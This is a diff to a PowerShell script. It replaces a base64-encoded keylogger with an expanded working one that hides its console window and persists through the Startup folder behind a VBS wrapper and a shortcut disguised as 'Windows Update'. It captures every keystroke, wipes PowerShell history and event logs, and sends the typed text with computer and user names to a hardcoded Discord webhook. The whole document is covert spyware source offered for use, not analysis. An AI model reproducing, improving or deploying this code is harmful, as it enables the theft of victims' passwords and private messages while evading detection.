@@ -1,1 +1,231 @@
-JHdlYmhvb2sgPSAnaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI5MjEwNzk1MjA3Njg4MTkzMC9pckhRazhNZ2U4WWxKR2YzejJqeDUyZmRWeTRzWjVESm9YM0NnUmxGUE5fdE1yXzNuMmU5V0RJekRINUM0Y01NOTExcycNCiRrZXlib2FyZENvZGUgPSAndXNpbmcgU3lzdGVtO3VzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcztwdWJsaWMgY2xhc3MgS3tbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIildcHVibGljIHN0YXRpYyBleHRlcm4gc2hvcnQgR2V0QXN5bmNLZXlTdGF0ZShpbnQgayk7fScNCkFkZC1UeXBlIC1UeXBlRGVmaW5pdGlvbiAka2V5Ym9hcmRDb2RlDQoNCiRrZXlNYXAgPSBAe30NCjY1Li45MCB8IEZvckVhY2gtT2JqZWN0IHsgJGtleU1hcFskX10gPSBbY2hhcl0kXyB9DQo0OC4uNTcgfCBGb3JFYWNoLU9iamVjdCB7ICRrZXlNYXBbJF9dID0gW2NoYXJdJF8gfQ0KJGtleU1hcFsxM10gPSAnW0VOVEVSXScNCiRrZXlNYXBbMzJdID0gJyAnDQoka2V5TWFwWzhdID0gJ1tCQUNLXScNCiRrZXlNYXBbOV0gPSAnW1RBQl0nDQoNCiRidWZmZXIgPSAnJw0KJGxhc3RTZW5kID0gR2V0LURhdGUNCiR0b3RhbFNlbnQgPSAwDQokY3ljbGUgPSAxDQokY29tcHV0ZXIgPSAkZW52OkNPTVBVVEVSTkFNRQ0KJHVzZXIgPSAkZW52OlVTRVJOQU1FDQoNV3JpdGUtSG9zdCAnS2V5bG9nZ2VyIFN0YXJ0ZWQnDQoNd2hpbGUoJHRydWUpIHsNCiAgICA2NS4uOTAgfCBGb3JFYWNoLU9iamVjdCB7IGlmKFtLXTo6R2V0QXN5bmNLZXlTdGF0ZSgkXykgLWVxIC0zMjc2NykgeyAkYnVmZmVyICs9IFtjaGFyXSRfIH0gfQ0KICAgIDQ4Li41NyB8IEZvckVhY2gtT2JqZWN0IHsgaWYoW0tdOjpHZXRBc3luY0tleVN0YXRlKCRfKSAtZXEgLTMyNzY3KSB7ICRidWZmZXIgKz0gW2NoYXJdJF8gfSB9DQogICAgaWYoW0tdOjpHZXRBc3luY0tleVN0YXRlKDEzKSAtZXEgLTMyNzY3KSB7ICRidWZmZXIgKz0gJ1tFTlRFUl0nIH0NCiAgICBpZihbS106OkdldEFzeW5jS2V5U3RhdGUoMzIpIC1lcSAtMzI3NjcpIHsgJGJ1ZmZlciArPSAnICcgfQ0KICAgIGlmKFtLXTo6R2V0QXN5bmNLZXlTdGF0ZSg4KSAtZXEgLTMyNzY3KSB7ICRidWZmZXIgKz0gJ1tCQUNLXScgfQ0KDQogICAgJHRpbWVFbGFwc2VkID0gKChHZXQtRGF0ZSkgLSAkbGFzdFNlbmQpLlRvdGFsU2Vjb25kcw0KDQogICAgaWYoJGJ1ZmZlci5MZW5ndGggLWdlIDEwMCAtb3IgJHRpbWVFbGFwc2VkIC1nZSAzMCkgew0KICAgICAgICBpZigkYnVmZmVyLkxlbmd0aCAtZ3QgMCkgew0KICAgICAgICAgICAgV3JpdGUtSG9zdCAiW0N5Y2xlICRjeWNsZV0gU2VuZGluZyAkKCRidWZmZXIuTGVuZ3RoKSBjaGFycy4uLiINCg0KICAgICAgICAgICAgJHRpbWVzdGFtcCA9IEdldC1EYXRlIC1Gb3JtYXQgJ3l5eXktTU0tZGQgSEg6bW06c3MnDQogICAgICAgICAgICAkbWVzc2FnZSA9ICIkY29tcHV0ZXIvJHVzZXIgWyR0aW1lc3RhbXBdDQpgYGAkYnVmZmVyYGBgIg0KICAgICAgICAgICAgJHBheWxvYWQgPSBAe2NvbnRlbnQgPSAkbWVzc2FnZX0gfCBDb252ZXJ0VG8tSnNvbg0KDQogICAgICAgICAgICB0cnkgew0KICAgICAgICAgICAgICAgIEludm9rZS1SZXN0TWV0aG9kIC1VcmkgJHdlYmhvb2sgLU1ldGhvZCBQb3N0IC1Cb2R5ICRwYXlsb2FkIC1Db250ZW50VHlwZSAnYXBwbGljYXRpb24vanNvbicNCiAgICAgICAgICAgICAgICAkdG90YWxTZW50ICs9ICRidWZmZXIuTGVuZ3RoDQogICAgICAgICAgICAgICAgV3JpdGUtSG9zdCAiW09LXSBTZW50ISBUb3RhbDogJHRvdGFsU2VudCBjaGFycyINCiAgICAgICAgICAgIH0gY2F0Y2ggew0KICAgICAgICAgICAgICAgIFdyaXRlLUhvc3QgIltFUlJdIEZhaWxlZCB0byBzZW5kIg0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAkYnVmZmVyID0gJycNCiAgICAgICAgICAgICRjeWNsZSsrDQogICAgICAgIH0NCg0KICAgICAgICAkbGFzdFNlbmQgPSBHZXQtRGF0ZQ0KICAgICAgICBXcml0ZS1Ib3N0ICJOZXh0IHNlbmQ6ICQoR2V0LURhdGUgLUZvcm1hdCAnSEg6bW06c3MnKSINCiAgICAgICAgV3JpdGUtSG9zdCAnLS0tJw0KICAgIH0NCg0KICAgIFN0YXJ0LVNsZWVwIC1NaWxsaXNlY29uZHMgNDANCn0=
+$webhook = 'https://discord.com/api/webhooks/1462829051788918795/mGc2VRl4DFVcQUZHMEKLrq3DWMPzf2shF2xEwY8fcSZa6zqI_7ddS7p7hR63z_Y_vdIZ'
+
+# Keyboard Safe Checking - IMPROVED VERSION
+$keyboardCode = @'
+using System;
+using System.Runtime.InteropServices;
+public class K {
+    [DllImport("user32.dll")]
+    public static extern short GetAsyncKeyState(int k);
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetConsoleWindow();
+    [DllImport("user32.dll")]
+    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+}
+'@
+Add-Type -TypeDefinition $keyboardCode
+
+# Hide console window immediately
+$consolePtr = [K]::GetConsoleWindow()
+[K]::ShowWindow($consolePtr, 0)
+
+# Silent self-copy to Startup folder
+$startupPath = [Environment]::GetFolderPath('Startup')
+$currentScript = $MyInvocation.MyCommand.Path
+
+if (-not [string]::IsNullOrEmpty($currentScript)) {
+    $newName = "temp_clean.ps1"
+    $targetPath = Join-Path $startupPath $newName
+    
+    if (-not (Test-Path $startupPath)) {
+        New-Item -ItemType Directory -Path $startupPath -Force | Out-Null
+    }
+    
+    Copy-Item -Path $currentScript -Destination $targetPath -Force | Out-Null
+    
+    # Create VBS wrapper
+    $vbsPath = Join-Path $startupPath "temp_clean.vbs"
+    $vbsContent = @"
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$targetPath""", 0, False
+Set objShell = Nothing
+"@
+    
+    $vbsContent | Out-File -FilePath $vbsPath -Encoding ASCII
+    
+    # Create shortcut
+    $wsh = New-Object -ComObject WScript.Shell
+    $shortcutPath = Join-Path $startupPath "Windows Update.lnk"
+    $shortcut = $wsh.CreateShortcut($shortcutPath)
+    $shortcut.TargetPath = "wscript.exe"
+    $shortcut.Arguments = "//B `"$vbsPath`""
+    $shortcut.WindowStyle = 7
+    $shortcut.Save()
+    
+    Start-Process "wscript.exe" -ArgumentList "//B `"$vbsPath`"" -WindowStyle Hidden
+}
+
+# Setup - IMPROVED
+$buffer = ''
+$lastSend = Get-Date
+$computer = $env:COMPUTERNAME
+$user = $env:USERNAME
+
+# Clear logs function
+function Clear-Logs {
+    Remove-Item -Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
+    wevtutil cl "Windows PowerShell" /q 2>$null
+    wevtutil cl "Microsoft-Windows-PowerShell/Operational" /q 2>$null
+}
+
+# Initial cleanup
+Clear-Logs
+$ErrorActionPreference = 'SilentlyContinue'
+$ProgressPreference = 'SilentlyContinue'
+
+# IMPROVED KEYLOGGER - ACCURATE VERSION
+while($true) {
+    # Track shift state
+    $shiftPressed = ([K]::GetAsyncKeyState(16) -band 0x8000) -ne 0
+    $capsLock = [Console]::CapsLock
+    
+    # Letters A-Z (with shift/caps detection)
+    65..90 | ForEach-Object {
+        if(([K]::GetAsyncKeyState($_) -band 0x8000) -ne 0) {
+            $key = [char]$_
+            
+            # Determine if uppercase
+            $isUppercase = $shiftPressed -xor $capsLock
+            
+            if(-not $isUppercase) {
+                $key = $key.ToLower()
+            }
+            
+            $buffer += $key
+            Start-Sleep -Milliseconds 50  # Debounce
+        }
+    }
+    
+    # Numbers 0-9 (top row)
+    48..57 | ForEach-Object {
+        if(([K]::GetAsyncKeyState($_) -band 0x8000) -ne 0) {
+            if($shiftPressed) {
+                # Shift + numbers = symbols
+                $symbols = @(')', '!', '@', '#', '$', '%', '^', '&', '*', '(')
+                $buffer += $symbols[$_ - 48]
+            } else {
+                $buffer += [char]$_
+            }
+            Start-Sleep -Milliseconds 50
+        }
+    }
+    
+    # Numpad numbers
+    96..105 | ForEach-Object {
+        if(([K]::GetAsyncKeyState($_) -band 0x8000) -ne 0) {
+            $buffer += ([char]($_ - 48))
+            Start-Sleep -Milliseconds 50
+        }
+    }
+    
+    # SPACE BAR (FIXED)
+    if(([K]::GetAsyncKeyState(32) -band 0x8000) -ne 0) {
+        $buffer += ' '
+        Start-Sleep -Milliseconds 50
+    }
+    
+    # ENTER key
+    if(([K]::GetAsyncKeyState(13) -band 0x8000) -ne 0) {
+        $buffer += "[ENTER]`n"
+        Start-Sleep -Milliseconds 50
+    }
+    
+    # BACKSPACE
+    if(([K]::GetAsyncKeyState(8) -band 0x8000) -ne 0) {
+        if($buffer.Length -gt 0) {
+            $buffer = $buffer.Substring(0, $buffer.Length - 1)
+        }
+        Start-Sleep -Milliseconds 50
+    }
+    
+    # TAB
+    if(([K]::GetAsyncKeyState(9) -band 0x8000) -ne 0) {
+        $buffer += "[TAB]"
+        Start-Sleep -Milliseconds 50
+    }
+    
+    # Punctuation (with shift detection)
+    # Period/Dot
+    if(([K]::GetAsyncKeyState(190) -band 0x8000) -ne 0) {
+        $buffer += if($shiftPressed) { '>' } else { '.' }
+        Start-Sleep -Milliseconds 50
+    }
+    
+    # Comma
+    if(([K]::GetAsyncKeyState(188) -band 0x8000) -ne 0) {
+        $buffer += if($shiftPressed) { '<' } else { ',' }
+        Start-Sleep -Milliseconds 50
+    }
+    
+    # Slash/Question mark
+    if(([K]::GetAsyncKeyState(191) -band 0x8000) -ne 0) {
+        $buffer += if($shiftPressed) { '?' } else { '/' }
+        Start-Sleep -Milliseconds 50
+    }
+    
+    # Semicolon/Colon
+    if(([K]::GetAsyncKeyState(186) -band 0x8000) -ne 0) {
+        $buffer += if($shiftPressed) { ':' } else { ';' }
+        Start-Sleep -Milliseconds 50
+    }
+    
+    # Apostrophe/Quotation
+    if(([K]::GetAsyncKeyState(222) -band 0x8000) -ne 0) {
+        $buffer += if($shiftPressed) { '"' } else { "'" }
+        Start-Sleep -Milliseconds 50
+    }
+    
+    # Brackets
+    if(([K]::GetAsyncKeyState(219) -band 0x8000) -ne 0) {
+        $buffer += if($shiftPressed) { '{' } else { '[' }
+        Start-Sleep -Milliseconds 50
+    }
+    
+    if(([K]::GetAsyncKeyState(221) -band 0x8000) -ne 0) {
+        $buffer += if($shiftPressed) { '}' } else { ']' }
+        Start-Sleep -Milliseconds 50
+    }
+    
+    # Backslash/Pipe
+    if(([K]::GetAsyncKeyState(220) -band 0x8000) -ne 0) {
+        $buffer += if($shiftPressed) { '|' } else { '\' }
+        Start-Sleep -Milliseconds 50
+    }
+    
+    # Dash/Underscore
+    if(([K]::GetAsyncKeyState(189) -band 0x8000) -ne 0) {
+        $buffer += if($shiftPressed) { '_' } else { '-' }
+        Start-Sleep -Milliseconds 50
+    }
+    
+    # Equals/Plus
+    if(([K]::GetAsyncKeyState(187) -band 0x8000) -ne 0) {
+        $buffer += if($shiftPressed) { '+' } else { '=' }
+        Start-Sleep -Milliseconds 50
+    }
+    
+    # Send data every 30 seconds OR 500 characters
+    $timeElapsed = ((Get-Date) - $lastSend).TotalSeconds
+    
+    if($buffer.Length -ge 500 -or $timeElapsed -ge 30) {
+        if($buffer.Length -gt 0) {
+            $timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
+            $message = "**$computer/$user** [$timestamp]`n" + '```' + "$buffer" + '```'
+            $payload = @{content = $message} | ConvertTo-Json -Compress
+            
+            try {
+                Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType 'application/json' -TimeoutSec 10
+                Clear-Logs
+            } catch {
+                # Save buffer to file if sending fails
+                $tempFile = "$env:TEMP\kl_backup.txt"
+                $buffer | Out-File -FilePath $tempFile -Append -Encoding UTF8
+            }
+            
+            $buffer = ''
+        }
+        $lastSend = Get-Date
+    }
+    
+    Start-Sleep -Milliseconds 10
+}
